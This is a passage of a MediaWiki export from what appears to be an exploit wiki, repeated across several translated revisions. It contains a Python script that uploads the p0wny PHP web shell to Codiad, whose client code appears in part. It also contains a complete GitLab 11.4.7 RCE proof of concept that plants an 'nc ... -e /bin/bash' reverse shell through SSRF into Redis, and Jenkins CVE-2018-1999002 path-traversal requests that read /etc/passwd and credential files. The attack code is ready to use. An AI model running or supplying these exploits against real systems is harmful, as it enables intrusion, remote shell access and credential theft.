(/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xc3\xa2\xc2\x80\xc2\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------289777152427948045812862014674--\r\n"

#Construct link and posting request which will upload the file:
link_exploit = link_base + 'components/filemanager/controller.php?action=upload&amp;path=/var/www/html/data/' + projectname
print('')
print('Posting request wich will upload the file: ')
exploit = requests.post(link_exploit, headers=header, data=data)
print('Response:')
print(exploit.text)
time.sleep(2)


'''
Finish:
'''
print('')
print('File uploaded except you got an error message before. If so please run this program again and correct your',
      'mistakes!')
print('')
print('Path of file on the server: http://' + target_ip + ':' + target_port + codiadpath + '/data/' + projectname + '/' + 'shell.php')
print('')
&lt;/pre&gt;</text>
      <sha1>d1tu80xskyea7jkgnbob78lf7rl3n93</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-19585&amp;CVE-2018-19571 GitLab 11.4.7 RCE漏洞</title>
    <ns>0</ns>
    <id>1031</id>
    <revision>
      <id>1306</id>
      <timestamp>2021-04-09T08:50:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: GitLab 11.4.7 RCE (POC) # Date: 24th December 2020 # Exploit Author: Norbert Hofmann # Exploit Modifications: Sam Redmond, Tam Lai Yin # Origina..."</comment>
      <origin>1306</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3785" sha1="in50ia1vitysiybjyl5l3tecunb6flk" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: GitLab 11.4.7 RCE (POC)
# Date: 24th December 2020
# Exploit Author: Norbert Hofmann
# Exploit Modifications: Sam Redmond, Tam Lai Yin
# Original Author: Mohin Paramasivam
# Software Link: https://gitlab.com/
# Environment: GitLab 11.4.7, community edition
# CVE: CVE-2018-19571 + CVE-2018-19585

#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
import random


parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE')
parser.add_argument('-u', help='GitLab Username/Email', required=True)
parser.add_argument('-p', help='Gitlab Password', required=True)
parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
parser.add_argument('-l', help='reverse shell ip', required=True)
parser.add_argument('-P', help='reverse shell port', required=True)
args = parser.parse_args()

username = args.u
password = args.p
gitlab_url = args.g + ":5080"
local_ip = args.l
local_port = args.P

session = requests.Session()

# Get Authentication Token
r = session.get(gitlab_url + "/users/sign_in")
soup = BeautifulSoup(r.text, features="lxml")
token = soup.findAll('meta')[16].get("content")
print(f"[+] authenticity_token: {token}")

login_form = {
    "authenticity_token": token,
    "user[login]": username,
    "user[password]": password,
    "user[remember_me]": "0"
}
r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)

if r.status_code != 200:
    exit(f"Login Failed:{r.text}")

# Create project
import_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
project_name = f'project{random.randrange(1, 10000)}'
project_url = f'{gitlab_url}/{username}'

print(f"[+] Creating project with random name: {project_name}")

form = """\nmulti
    sadd resque:gitlab:queues system_hook_push
    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port} -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
    exec
    exec
    exec\n"""

r = session.get(f"{gitlab_url}/projects/new")
soup = BeautifulSoup(r.text, features="lxml")

namespace_id = soup.find(
    'input', {'name': 'project[namespace_id]'}).get('value')

project_token = soup.findAll('meta')[16].get("content")
project_token = project_token.replace("==", "%3D%3D")
project_token = project_token.replace("+", "%2B")

payload = f"utf8=%E2%9C%93&amp;authenticity_token={project_token}&amp;project%5Bimport_url%5D={import_url}{form}&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D={project_name}&amp;project%5Bnamespace_id%5D={namespace_id}&amp;project%5Bpath%5D={project_name}&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0"

cookies = {
    'sidebar_collapsed': 'false',
    'event_filter': 'all',
    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
    '_gitlab_session': session.cookies['_gitlab_session'],
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': f'{gitlab_url}/projects',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '398',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

print("[+] Running Exploit")
r = session.post(
    gitlab_url+'/projects', data=payload, cookies=cookies, headers=headers, verify=False)
if "The change you requested was rejected." in r.text:
    exit('Exploit failed, check input params')

print('[+] Exploit completed successfully!')
&lt;/pre&gt;</text>
      <sha1>in50ia1vitysiybjyl5l3tecunb6flk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1999002 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>178</id>
    <revision>
      <id>281</id>
      <timestamp>2021-03-09T08:11:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  &lt;translate&gt; ==影響版本== Jenkins weekly 2.132 以及更早的版本 Jenkins LTS 2.121.1 以及更早的版本  可以讀取Windows系統服務器中的任..."</comment>
      <origin>281</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1330" sha1="h2woxs09enyfgrio3zgsy3e2lpchif0" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==影響版本==
Jenkins weekly 2.132 以及更早的版本
Jenkins LTS 2.121.1 以及更早的版本

可以讀取Windows系統服務器中的任意文件，且在特定而條件下也可以讀取Linux系統服務器中的文件.

==漏洞利用==
需要已經開啟了匿名用戶讀取權限，在請求頭中添加：
&lt;/translate&gt;
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

&lt;translate&gt;
處理請求中的包含路徑，比如/plugin/xxxx，可以嘗試:
&lt;/translate&gt;

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>h2woxs09enyfgrio3zgsy3e2lpchif0</sha1>
    </revision>
    <revision>
      <id>282</id>
      <parentid>281</parentid>
      <timestamp>2021-03-09T08:11:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>282</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1374" sha1="b4cyxoj6ouqoe7qm8hbg7w7i4r82otv" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
Jenkins weekly 2.132 以及更早的版本
Jenkins LTS 2.121.1 以及更早的版本

&lt;!--T:2--&gt;
可以讀取Windows系統服務器中的任意文件，且在特定而條件下也可以讀取Linux系統服務器中的文件.

==漏洞利用== &lt;!--T:3--&gt;
需要已經開啟了匿名用戶讀取權限，在請求頭中添加：
&lt;/translate&gt;
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
處理請求中的包含路徑，比如/plugin/xxxx，可以嘗試:
&lt;/translate&gt;

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>b4cyxoj6ouqoe7qm8hbg7w7i4r82otv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1999002 任意文件讀取漏洞/id</title>
    <ns>0</ns>
    <id>2882</id>
    <revision>
      <id>3383</id>
      <timestamp>2021-05-26T13:22:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versi yang terpengaruh == Jenkins weekly 2.132 dan versi sebelumnya Jenkins LTS 2.121.1 dan versi sebelumnya"</comment>
      <origin>3383</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1335" sha1="4lalgph4bn08ypaihyzch1qquorvc9y" xml:space="preserve">&lt;languages   /&gt;

== Versi yang terpengaruh ==
Jenkins weekly 2.132 dan versi sebelumnya
Jenkins LTS 2.121.1 dan versi sebelumnya

Itu dapat membaca file apa pun di server sistem Windows, dan dalam kondisi tertentu, itu juga dapat membaca file di server sistem Linux.

== Eksploitasi ==
Anda harus mengaktifkan izin baca pengguna anonim, tambahkan di header permintaan:
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

Untuk memproses jalur penyertaan dalam permintaan, seperti /plugin/xxxx, Anda dapat mencoba:

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>4lalgph4bn08ypaihyzch1qquorvc9y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1999002 任意文件讀取漏洞/zh-cn</title>
    <ns>0</ns>
    <id>6169</id>
    <revision>
      <id>7056</id>
      <timestamp>2021-07-12T07:25:30Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "CVE-2018-1999002任意文件读取漏洞"</comment>
      <origin>7056</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1524" sha1="efj247i8rs5g0o2zsqra51xmfkbrmqc" xml:space="preserve">&lt;languages   /&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==影響版本==
Jenkins weekly 2.132 以及更早的版本
Jenkins LTS 2.121.1 以及更早的版本
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
可以讀取Windows系統服務器中的任意文件，且在特定而條件下也可以讀取Linux系統服務器中的文件.
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
需要已經開啟了匿名用戶讀取權限，在請求頭中添加：
&lt;/div&gt;
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
處理請求中的包含路徑，比如/plugin/xxxx，可以嘗試:
&lt;/div&gt;

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>efj247i8rs5g0o2zsqra51xmfkbrmqc</sha1>
    </revision>
    <revision>
      <id>7058</id>
      <parentid>7056</parentid>
      <timestamp>2021-07-12T07:26:30Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "==影响版本== Jenkins weekly 2.132以及更早的版本 Jenkins LTS 2.121.1以及更早的版本"</comment>
      <origin>7058</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1461" sha1="k7tjs0f0rvz0otdro5v2t7rk79vs9b6" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
Jenkins weekly 2.132以及更早的版本
Jenkins LTS 2.121.1以及更早的版本

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
可以讀取Windows系統服務器中的任意文件，且在特定而條件下也可以讀取Linux系統服務器中的文件.
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
需要已經開啟了匿名用戶讀取權限，在請求頭中添加：
&lt;/div&gt;
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
處理請求中的包含路徑，比如/plugin/xxxx，可以嘗試:
&lt;/div&gt;

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>k7tjs0f0rvz0otdro5v2t7rk79vs9b6</sha1>
    </revision>
    <revision>
      <id>7060</id>
      <parentid>7058</parentid>
      <timestamp>2021-07-12T07:26:55Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "可以读取Windows系统服务器中的任意文件，且在特定条件下也可以读取Linux系统服务器中的文件。"</comment>
      <origin>7060</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1399" sha1="es1ow29rna2o7hoyw9i7m81iazqeose" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
Jenkins weekly 2.132以及更早的版本
Jenkins LTS 2.121.1以及更早的版本

可以读取Windows系统服务器中的任意文件，且在特定条件下也可以读取Linux系统服务器中的文件。

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
需要已經開啟了匿名用戶讀取權限，在請求頭中添加：
&lt;/div&gt;
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
處理請求中的包含路徑，比如/plugin/xxxx，可以嘗試:
&lt;/div&gt;

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>es1ow29rna2o7hoyw9i7m81iazqeose</sha1>
    </revision>
    <revision>
      <id>7062</id>
      <parentid>7060</parentid>
      <timestamp>2021-07-12T07:27:27Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "==漏洞利用== 需要已经开启了匿名用户读取权限，在请求头中添加："</comment>
      <origin>7062</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1338" sha1="hn7ytkod8eefev6ftorl7k9qdjqtkan" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
Jenkins weekly 2.132以及更早的版本
Jenkins LTS 2.121.1以及更早的版本

可以读取Windows系统服务器中的任意文件，且在特定条件下也可以读取Linux系统服务器中的文件。

==漏洞利用==
需要已经开启了匿名用户读取权限，在请求头中添加：
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
處理請求中的包含路徑，比如/plugin/xxxx，可以嘗試:
&lt;/div&gt;

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>hn7ytkod8eefev6ftorl7k9qdjqtkan</sha1>
    </revision>
    <revision>
      <id>7064</id>
      <parentid>7062</parentid>
      <timestamp>2021-07-12T07:27:49Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "处理请求中的包含路径，比如/plugin/xxxx，可以尝试："</comment>
      <origin>7064</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1279" sha1="t5rk1mzarb6brde9v5yv4ncir1vaagw" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
Jenkins weekly 2.132以及更早的版本
Jenkins LTS 2.121.1以及更早的版本

可以读取Windows系统服务器中的任意文件，且在特定条件下也可以读取Linux系统服务器中的文件。

==漏洞利用==
需要已经开启了匿名用户读取权限，在请求头中添加：
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

处理请求中的包含路径，比如/plugin/xxxx，可以尝试：

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
